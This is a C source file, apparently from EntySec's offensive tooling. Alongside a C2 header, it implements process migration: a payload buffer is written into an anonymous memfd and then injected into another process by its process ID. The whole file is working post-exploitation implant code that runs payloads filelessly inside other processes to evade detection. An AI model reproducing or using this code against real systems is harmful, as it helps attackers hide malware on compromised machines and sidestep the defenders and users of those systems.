/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <limits.h>
#include <unistd.h>
#include <stdio.h>
#include <syscall.h>

#include <injector.h>

#include <c2.h>
#include <log.h>
#include <migrate.h>

int migrate_init(pid_t pid, int length, unsigned char *buffer)
{
#if defined(__linux__) || defined(__unix__)
    int fd;
    char image[PATH_MAX];

    fd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);

    if (fd >= 0)
    {
        write(fd, buffer, length);
        sprintf(image, "/proc/self/fd/%d", fd);

        migrate_inject(pid, image);
        return 0;
    }
#endif

    return -1;
}

int migrate_inject(pid_t pid, char *image)
{
    injector_t *injector;

    if (injector_attach(&injector, pid) < 0)
    {
        return -1;
    }

#ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
    if (injector_inject_in_cloned_thread(injector, image, NULL) < 0)
    {
        goto fail;
    }
#else
    if (injector_inject(injector, image, NULL) < 0)
    {
        goto fail;
    }
#endif

    injector_detach(injector);
    return 0;

fail:
    log_debug("* Failed to do inject (%s)\n", injector_error());
    injector_detach(injector);
    return -1;
}
